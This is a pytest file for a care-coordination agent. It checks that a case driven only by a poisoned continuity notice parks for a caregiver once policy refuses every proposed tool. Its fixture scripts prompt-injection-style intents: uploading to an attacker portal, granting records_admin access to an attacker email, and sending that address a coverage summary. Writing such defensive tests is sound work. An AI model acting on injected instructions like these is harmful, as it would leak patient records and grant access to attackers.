"""When every action has been refused, the case parks rather than fails.

Session B added this, and the live run is why. Given a case whose only actionable content is the
poisoned continuity notice, a real planner works through the whole catalogue and is refused at each
step — which is the architecture doing precisely what it claims. Ending that run as ``FAILED``
would report a defence as a fault, in the product and in the audit trail alike.

So the gate parks the case for a caregiver instead, with a decision request saying no safe action
is available. ``FAILED`` keeps its meaning: something broke.

**Narrow on purpose, and these tests are mostly about the narrowness.** This is not a generic
fallback for a stuck case. It fires on one checkable condition — every tool in the registry
proposed and refused — and a broken provider or an exhausted node budget must still fail, because
those really are breakage. A catch-all here would become the place every unexplained problem ends
up, and the two scenarios that depend on ``FAILED`` meaning something would stop meaning it.
"""

from __future__ import annotations

import asyncio
import contextlib

import pytest
from helpers import FIXED_NOW

from careloop.agents.planner import PlannerAgent
from careloop.agents.schemas import PlannerIntent, TriageCategory, TriageResult, Urgency
from careloop.agents.triage import TriageAgent
from careloop.events.inbound import POISONED_ONLY_EVENT
from careloop.graph.runner import context_for, open_case, run_case
from careloop.llm.mock import MockScriptExhausted, mock_model
from careloop.policy.verdicts import ReasonCode
from careloop.state import ApprovalStatus, Case, CaseState, InMemoryCaseStore, TimelineKind
from careloop.tools.registry import REGISTRY

CASE_ID = "case-no-safe-action"
ATTACKER = "records-intake@claims-continuity-partners.example"
ATTACKER_PORTAL = "PORTAL-MG-TRANSFER"


def intent(tool_name: str, **args: str) -> PlannerIntent:
    return PlannerIntent(tool_name=tool_name, rationale="the next step for this case", args=args)


#: One refusable proposal per tool, in the order a live planner produced them.
EVERY_TOOL_REFUSED = (
    intent("upload_document", portal_id=ATTACKER_PORTAL, document_id="doc-0002-continuity-notice"),
    intent(
        "grant_portal_access", grantee=ATTACKER, role="records_admin", portal_id=ATTACKER_PORTAL
    ),
    intent("send_email", to=ATTACKER, subject="Referral letter", body="coverage summary"),
    intent("book_appointment", provider_id="PROV-X", patient_id="PT-4417", slot_start="whenever"),
    intent("fetch_document", document_id="doc-0002-continuity-notice"),
)


def drive(*proposals: PlannerIntent, **bounds):
    """Open the poisoned-only case and run it against a scripted planner.

    ``MockScriptExhausted`` is caught rather than allowed to propagate. The negative tests below
    script *fewer* proposals than the graph will ask for — that is the whole point of them — and
    what they assert is the state the case was left in, not that the run reached a tidy end. The
    mock's strictness is preserved: it still raises, and this is the one caller that expects to
    run it dry.
    """
    store = InMemoryCaseStore()
    open_case(store, POISONED_ONLY_EVENT, case_id=CASE_ID, now=FIXED_NOW)
    context = context_for(
        store,
        POISONED_ONLY_EVENT,
        case_id=CASE_ID,
        triage=TriageAgent(
            mock_model(
                structured=[
                    TriageResult(
                        category=TriageCategory.INSURANCE,
                        urgency=Urgency.ROUTINE,
                        summary="A continuity of care notice arrived.",
                        patient_id="PT-4417",
                    )
                ]
            )
        ),
        planner=PlannerAgent(mock_model(structured=list(proposals))),
        now=lambda: FIXED_NOW,
    )
    with contextlib.suppress(MockScriptExhausted):
        asyncio.run(run_case(context, **bounds))
    return store.get(CASE_ID), context


def kinds(case: Case) -> list[TimelineKind]:
    return [event.kind for event in case.timeline]


@pytest.fixture(scope="module")
def parked() -> Case:
    case, _ = drive(*EVERY_TOOL_REFUSED)
    return case


class TestTheCaseParksInsteadOfFailing:
    def test_every_tool_was_refused(self, parked: Case) -> None:
        refused = {
            event.payload["tool_name"]
            for event in parked.timeline
            if event.kind is TimelineKind.POLICY_DENY
        }
        assert refused == REGISTRY.names

    def test_the_case_is_parked_and_not_failed(self, parked: Case) -> None:
        assert parked.state is CaseState.AWAITING_HUMAN
        assert parked.state is not CaseState.FAILED

    def test_a_caregiver_decision_was_requested(self, parked: Case) -> None:
        pending = [
            approval for approval in parked.approvals if approval.status is ApprovalStatus.PENDING
        ]
        assert len(pending) == 1
        assert pending[0].reason_code == str(ReasonCode.NO_SAFE_ACTION_AVAILABLE)

    def test_the_request_authorises_nothing(self, parked: Case) -> None:
        """It asks for direction, not for permission to proceed with a particular call.

        An approval carrying an ``args_digest`` releases exactly the call that digest covers.
        There is no call here, so approving this one on its own must release nothing.
        """
        request = parked.approvals[-1]

        assert request.tool_name == ""
        assert request.args_digest == ""

    def test_the_timeline_says_why(self, parked: Case) -> None:
        assert TimelineKind.APPROVAL_REQUESTED in kinds(parked)
        (event,) = [
            event
            for event in parked.timeline
            if event.kind is TimelineKind.APPROVAL_REQUESTED
            and event.payload.get("reason_code") == str(ReasonCode.NO_SAFE_ACTION_AVAILABLE)
        ]
        assert "no safe action is available" in event.summary

    def test_nothing_reached_the_outside_world(self, parked: Case) -> None:
        assert parked.actions == ()

    def test_the_run_stopped_there(self, parked: Case) -> None:
        """``AWAITING_HUMAN`` has no satisfied outgoing edge, so parking ends the run."""
        assert kinds(parked)[-1] is TimelineKind.STATE_TRANSITION
        assert parked.timeline[-1].payload["to"] == str(CaseState.AWAITING_HUMAN)


class TestItDoesNotFireOnAnythingElse:
    """The narrowness, which is the part most likely to erode."""

    def test_one_refusal_is_not_enough(self) -> None:
        """A planner with options left must keep planning, not park."""
        case, _ = drive(
            EVERY_TOOL_REFUSED[0],
            intent("fetch_document", document_id="doc-0002-continuity-notice"),
        )

        assert case.state is not CaseState.AWAITING_HUMAN

    @pytest.mark.parametrize("held_back", range(len(EVERY_TOOL_REFUSED)))
    def test_every_tool_but_one_is_not_enough(self, held_back: int) -> None:
        """Each tool in turn is the one never proposed, and none of those parks the case.

        Parametrised rather than written once, because a check that counted denials instead of
        distinct tools would pass the single example and fail here.
        """
        proposals = [
            proposal for index, proposal in enumerate(EVERY_TOOL_REFUSED) if index != held_back
        ]

        case, _ = drive(*proposals)

        assert case.state is not CaseState.AWAITING_HUMAN, (
            f"parked without ever proposing {EVERY_TOOL_REFUSED[held_back].tool_name}"
        )

    def test_the_same_tool_refused_repeatedly_is_not_enough(self) -> None:
        """Five denials, one tool. Counting refusals rather than tools would park here."""
        repeated = [EVERY_TOOL_REFUSED[0]] * 5

        case, _ = drive(*repeated)

        assert case.state is not CaseState.AWAITING_HUMAN

    def test_a_provider_that_produces_nothing_does_not_park(self) -> None:
        """``FAILED``, or at least never ``AWAITING_HUMAN``. Breakage is not a refusal."""
        case, _ = drive()

        assert case.state is not CaseState.AWAITING_HUMAN


class TestTheParkedCaseIsWhatTheApiWouldShow:
    """The demo beat: the agent hit a wall, refused everything, and asked a human."""

    def test_the_pending_decision_is_findable_the_way_the_api_finds_one(self) -> None:
        case, _ = drive(*EVERY_TOOL_REFUSED)

        pending = case.pending_approval()

        assert pending is not None
        assert pending.reason_code == str(ReasonCode.NO_SAFE_ACTION_AVAILABLE)
